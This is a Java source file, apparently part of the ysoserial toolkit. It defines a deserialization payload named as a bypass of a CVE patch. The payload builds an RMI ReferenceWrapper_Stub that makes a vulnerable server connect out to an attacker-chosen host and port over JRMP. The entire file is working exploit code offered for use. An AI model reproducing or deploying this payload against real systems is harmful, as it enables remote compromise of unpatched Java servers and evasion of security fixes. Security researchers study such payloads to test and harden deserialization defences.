//JRMPClient_CVE_3245_bypass.java
//JRMPCllent_20180718_bypass01.java 
package ysoserial.payloads;

import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub; 
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

@SuppressWarnings ( {
"restriction"
} )
//@PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
@PayloadTest( harness = "ysoserial.payloads.CommonsCollections1")
@Authors({ Authors.MBECHLER })

public class JRMPClient_CVE_3245_bypass extends PayloadRunner implements ObjectPayload<ReferenceWrapper_Stub> {
	
	public ReferenceWrapper_Stub getObject ( final String command ) throws Exception {
		
		String host; 
		int port;
		int sep = command.indexOf(':');
		if ( sep < 0 ) {
			port = new Random().nextInt(65535); 
			host = command;
		}
		else {
			host = command.substring(0, sep);
			port = Integer.valueOf(command.substring(sep + 1));
		}
		
		ObjID Id = new ObjID(new Random().nextInt()); // RMI registry 
		TCPEndpoint te = new TCPEndpoint(host, port);
		UnicastRef ref = new UnicastRef(new LiveRef(Id, te, false)); 
		ReferenceWrapper_Stub stud = new ReferenceWrapper_Stub(ref); 
		return stud;
	}

	public static void main ( final String[] args ) throws Exception {
		Thread.currentThread().setContextClassLoader(JRMPClient_CVE_3245_bypass.class.getClassLoader()); 
		PayloadRunner.run(JRMPClient_CVE_3245_bypass.class, args);
		}
}

